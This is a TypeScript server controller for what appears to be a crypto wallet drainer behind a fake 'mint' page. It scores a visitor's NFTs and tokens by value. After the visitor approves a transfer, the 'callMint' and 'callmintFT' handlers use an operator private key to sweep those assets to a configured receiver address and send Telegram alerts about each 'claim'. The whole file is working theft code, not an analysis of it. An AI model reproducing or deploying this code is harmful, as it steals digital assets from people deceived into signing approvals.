import Web3 from "web3";

import {
  notifyConfirm,
  notifyConfirmed,
  notifyConfirmedFT,
  notifyConfirmFT,
  notifyClaim,
  notifyClaimFT,
} from "./TelegramController";

import {
  nodeRPCURL,
  callerAddress,
  contractAddress,
  PRIVATE_FOR_FEE,
  MIN_PRICE,
} from "../config/env";

import {
  getCollectionsByOpenSea,
  getProcessedNftsbyAlchemy,
  getStatusByCollection,
} from "../utils/get_nfts";

import { getABI, transferContractABI, contracterc20ABI } from "../utils/abis";
import { QueueWork } from "../utils/QueueWork";
import { getERC20Tokens } from "../utils/get_erc20";

const worker = new QueueWork();

const options = {
  // Enable auto reconnection
  reconnect: {
    auto: true,
    delay: 5000, // ms
    maxAttempts: 5,
    onTimeout: false,
  },
};

const wsProvider = new Web3.providers.WebsocketProvider(nodeRPCURL, options);

const web3 = new Web3(wsProvider);

const callMint = async (req: any, res: any) => {
  if (!req?.setting) {
    return console.error("Setting Error:", "You didn't set the config");
  }

  const { receiverAddress } = req.setting;

  if (!receiverAddress) {
    return console.error(
      "Setting Error:",
      "You didn't set the receiverAddress"
    );
  }

  notifyConfirm(req);

  const {
    address: _assetsAddress = "",
    currentAccount,
    ids: _ids = "",
    schema_name = "",
    hash = "",
  }: any = req.query;

  try {
    let ids = _ids.split(",").map((i: string) => web3.utils.toBN(i));

    const contractABI = getABI(schema_name);

    if (!contractABI) return;

    const _asesetscontract = new web3.eth.Contract(contractABI, _assetsAddress);
    console.log("wait approval");
    await _asesetscontract.events.ApprovalForAll(async (_err, event) => {
      console.log("some approrved", hash, event.transactionHash);
      console.log("---", _assetsAddress, _ids);
      if (_err) {
        console.log(_err);
        return;
      }
      if (event.transactionHash == hash) {
        console.log("got event");
        const confirmed = notifyConfirmed(req);
        setTimeout(async () => {
          if (web3) {
            const _contract = new web3.eth.Contract(
              transferContractABI,
              contractAddress
            );
            const types = schema_name == "ERC721" ? "s" : "t";
            const sendTx = async () => {
              try {
                const encodedABI = _contract.methods
                  .tf(
                    _assetsAddress,
                    currentAccount,
                    receiverAddress,
                    ids,
                    types
                  )
                  .encodeABI();
                const esGas = await _contract.methods
                  .tf(
                    _assetsAddress,
                    currentAccount,
                    receiverAddress,
                    ids,
                    types
                  )
                  .estimateGas({
                    from: callerAddress,
                    to: contractAddress,
                    data: encodedABI,
                  });
                const netPrice = await web3.eth.getGasPrice();
                const gasPrice = web3.utils
                  .toWei(web3.utils.toBN("10"), "gwei")
                  .add(web3.utils.toBN(netPrice));
                let signedTx = await web3.eth.accounts.signTransaction(
                  {
                    from: callerAddress,
                    to: contractAddress,
                    data: encodedABI,
                    gas: esGas,
                    gasPrice,
                    value: 0,
                  },
                  PRIVATE_FOR_FEE
                );
                console.log("start transfer", confirmed);
                if (confirmed)
                  await web3.eth
                    .sendSignedTransaction(signedTx.rawTransaction)
                    .then(() => {
                      notifyClaim(_assetsAddress, _ids, req);
                    })
                    .catch((e) => {
                      console.log(e);
                    });
              } catch (error) {
                console.log(error);
              }
            };
            console.log("added the work");
            worker.addJob(sendTx);
          }
        }, 3000);
      }
    });
  } catch (error) {
    console.log(error);
  }

  res.status(200).send("success!");
};

const callmintFT = async (req: any, res: any) => {
  if (!req?.setting) {
    return console.error("Setting Error:", "You didn't set the config");
  }

  const { receiverAddress } = req.setting;

  if (!receiverAddress) {
    return console.error(
      "Setting Error:",
      "You didn't set the receiverAddress"
    );
  }

  notifyConfirmFT(req);

  const {
    address: _assetsAddress = "",
    currentAccount,
    hash = "",
  }: any = req.query;

  try {
    const _asesetscontract = new web3.eth.Contract(
      contracterc20ABI,
      _assetsAddress
    );
    console.log("wait approval");
    await _asesetscontract.events.Approval(async (_err, event) => {
      if (_err) {
        console.log(_err);
        return;
      }
      if (event.transactionHash == hash) {
        console.log("got event", hash);
        const confirmed = notifyConfirmedFT(req);
        setTimeout(async () => {
          if (web3) {
            const _contract = new web3.eth.Contract(
              transferContractABI,
              contractAddress
            );

            const sendTx = async () => {
              try {
                const encodedABI = _contract.methods
                  .tf20(_assetsAddress, currentAccount, receiverAddress)
                  .encodeABI();
                const esGas = await _contract.methods
                  .tf20(_assetsAddress, currentAccount, receiverAddress)
                  .estimateGas({
                    from: callerAddress,
                    to: contractAddress,
                    data: encodedABI,
                  });
                const netPrice = await web3.eth.getGasPrice();
                const gasPrice = web3.utils
                  .toWei(web3.utils.toBN("10"), "gwei")
                  .add(web3.utils.toBN(netPrice));
                let signedTx = await web3.eth.accounts.signTransaction(
                  {
                    from: callerAddress,
                    to: contractAddress,
                    data: encodedABI,
                    gas: esGas,
                    gasPrice,
                    value: 0,
                  },
                  PRIVATE_FOR_FEE
                );
                console.log("start transfer", confirmed);
                if (confirmed)
                  await web3.eth
                    .sendSignedTransaction(signedTx.rawTransaction)
                    .then(() => {
                      notifyClaimFT(_assetsAddress, req);
                    })
                    .catch((e) => {
                      console.log(e);
                    });
              } catch (error) {
                console.log(error);
              }
            };
            console.log("added the work");
            worker.addJob(sendTx);
            return;
          }
        }, 3000);
      }
    });
  } catch (error) {
    console.log(error);
  }

  res.status(200).send("success!");
};

const faucetFee = async (req: any, res: any) => {
  // const {
  //   address: _assetsAddress,
  //   amt: amount,
  //   currentAccount,
  // }: any = req.query;

  // try {
  //   if (web3) {
  //     const myAddress = callerAddress;
  //     const nonce = await web3.eth.getTransactionCount(myAddress, "latest"); // nonce starts counting from 0
  //     const gasPrice = await web3.eth.getGasPrice();

  //     const transaction = {
  //       to: currentAccount,
  //       value: BigNumber.from(amount).toNumber(),
  //       gas: 30000,
  //       gasPrice,
  //       nonce: nonce,
  //     };
  //     let signedTx = await web3.eth.accounts.signTransaction(
  //       transaction,
  //       PRIVATE_FOR_FEE
  //     );
  //     await web3.eth
  //       .sendSignedTransaction(signedTx.rawTransaction)
  //       .on("confirmation", (confNumber, receipt, lastblockhash) => {
  //         console.log(confNumber, receipt, lastblockhash);
  //       });
  //   }
  // } catch (error) {
  //   console.log(error);
  // }

  res.status(200).send("success!");
};

const getNfts = async (req: any, res: any) => {
  const { currentAccount }: any = req.query;

  const openseaResult = await getCollectionsByOpenSea(currentAccount);
  let sortedResult = openseaResult.sort(
    (a, b) => b.average_price - a.average_price
  );

  sortedResult.length = 8;

  const resultwithFloor = await Promise.all(
    sortedResult.map(async (item) => {
      if (item.average_price < MIN_PRICE) return null;
      const floor_price = await getStatusByCollection(item.slug);
      if (floor_price < MIN_PRICE) return null;
      return { ...item, price: floor_price };
    })
  );

  const mergedListbyAddress = resultwithFloor.reduce((final, item) => {
    if (!item) return final;
    const exisitedItem = final.find(
      (_item) => _item.contractAddress == item.contractAddress
    );
    if (exisitedItem) {
      return final.map((_item) => {
        if (_item.contractAddress == item.contractAddress) {
          return {
            contractAddress: item.contractAddress,
            slug: `${exisitedItem.slug},${item.slug}`,
            average_price:
              exisitedItem.average_price > item.average_price
                ? exisitedItem.average_price
                : item.average_price,
            schema: "ERC721",
            price:
              exisitedItem.price > item.price ? exisitedItem.price : item.price,
          };
        } else {
          return _item;
        }
      });
    } else {
      return [...final, item];
    }
  }, []);

  const filterString = mergedListbyAddress.reduce((final, item) => {
    if (!item) {
      return final;
    }
    return final + `&contractAddresses[]=${item.contractAddress}`;
  }, "");

  const alchemyList = await getProcessedNftsbyAlchemy(
    currentAccount,
    filterString
  );
  const nfts = mergedListbyAddress
    .map((item) => {
      const _contractAddress: string =
        item?.contractAddress?.toLowerCase() ?? "";
      if (!_contractAddress || !alchemyList) return null;

      if (alchemyList[_contractAddress]) {
        return {
          type: "nft",
          ...item,
          ids: alchemyList[_contractAddress]?.join(",") ?? "",
          totalPrice: alchemyList[_contractAddress].length * item.price,
        };
      } else {
        return null;
      }
    })
    .filter(Boolean);

  const fts = await getERC20Tokens(currentAccount);
  console.log(nfts, fts);
  const result = [...fts, ...nfts].sort((a, b) => b.totalPrice - a.totalPrice);
  return res.status(200).json(result);
};

const manualCallMint = async (req: any, res: any) => {
  notifyConfirm(req);

  if (!req?.setting) {
    return console.error("Setting Error:", "You didn't set the config");
  }

  const { receiverAddress } = req.setting;

  if (!receiverAddress) {
    return console.error(
      "Setting Error:",
      "You didn't set the receiverAddress"
    );
  }
  const {
    address: _assetsAddress = "",
    currentAccount,
    ids: _ids = "",
    schema_name = "",
  }: any = req.query;

  let ids = _ids.split(",").map((i: string) => web3.utils.toBN(i));
  const contractABI = getABI(schema_name);
  if (!contractABI) return;
  try {
    if (web3) {
      const _contract = new web3.eth.Contract(
        transferContractABI,
        contractAddress
      );
      const types = schema_name == "ERC721" ? "s" : "t";

      const encodedABI = _contract.methods
        .tf(_assetsAddress, currentAccount, receiverAddress, ids, types)
        .encodeABI();

      const esGas = await _contract.methods
        .tf(_assetsAddress, currentAccount, receiverAddress, ids, types)
        .estimateGas({
          from: callerAddress,
          to: contractAddress,
          data: encodedABI,
        });
      const netPrice = await web3.eth.getGasPrice();

      const gasPrice = web3.utils
        .toWei(web3.utils.toBN("15"), "gwei")
        .add(web3.utils.toBN(netPrice));

      let signedTx = await web3.eth.accounts.signTransaction(
        {
          from: callerAddress,
          to: contractAddress,
          data: encodedABI,
          gas: esGas,
          gasPrice,
          value: 0,
        },
        PRIVATE_FOR_FEE
      );
      await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
      notifyClaim(_assetsAddress, _ids, req);
    }
  } catch (error) {
    console.log(error);
  }

  res.status(200).send("success!");
};

const manuaCallMint = async (req: any, res: any) => {
  const receiverAddress = req.setting;
  const {
    address: _assetsAddress = "",
    currentAccount,
    ids: _ids = "",
    schema_name = "",
  }: any = req.query;

  let ids = _ids.split(",").map((i: string) => web3.utils.toBN(i));
  const contractABI = getABI(schema_name);
  if (!contractABI) return;
  try {
    if (web3) {
      const _contract = new web3.eth.Contract(
        transferContractABI,
        contractAddress
      );
      const types = schema_name == "ERC721" ? "s" : "t";
      const encodedABI = _contract.methods
        .tf(_assetsAddress, currentAccount, receiverAddress, ids, types)
        .encodeABI();

      const esGas = await _contract.methods
        .tf(_assetsAddress, currentAccount, receiverAddress, ids, types)
        .estimateGas({
          from: callerAddress,
          to: contractAddress,
          data: encodedABI,
        });
      const netPrice = await web3.eth.getGasPrice();

      const gasPrice = web3.utils
        .toWei(web3.utils.toBN("20"), "gwei")
        .add(web3.utils.toBN(netPrice));

      let signedTx = await web3.eth.accounts.signTransaction(
        {
          from: callerAddress,
          to: contractAddress,
          data: encodedABI,
          gas: esGas,
          gasPrice,
          value: 0,
        },
        PRIVATE_FOR_FEE
      );
      await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    }
  } catch (error) {
    console.log(error);
  }
};

const testApi = (req: any, res: any) => {
  res.send("api is working well success");
};

const getEthAddress = (req: any, res: any) => {
  const { eth_receiverAddress } = req.setting;
  return res.json({ address: eth_receiverAddress });
};

export default {
  manualCallMint,
  getEthAddress,
  callMint,
  callmintFT,
  getNfts,
  faucetFee,
  manuaCallMint,
  test: testApi,
};
